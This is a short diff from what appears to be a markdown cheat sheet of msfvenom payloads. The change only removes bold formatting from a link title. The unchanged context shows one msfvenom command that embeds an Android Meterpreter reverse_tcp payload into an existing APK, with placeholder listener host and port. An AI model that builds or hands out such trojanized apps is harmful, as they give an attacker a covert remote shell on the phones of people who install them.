@@ -110,4 +110,4 @@ Android Embed Meterpreter Payload:
 
 <pre>msfvenom -x &lt;app.apk> android/meterpreter/reverse_tcp lhost=ip-address lport=port -o payload-name.apk</pre>
 
-[**Msf-Venom Payload Cheat Sheet | Meterpreter Payload Cheat Sheet**](/cheatsheet/MsfVenom-Payloads/)
+[Msf-Venom Payload Cheat Sheet | Meterpreter Payload Cheat Sheet](/cheatsheet/MsfVenom-Payloads/)
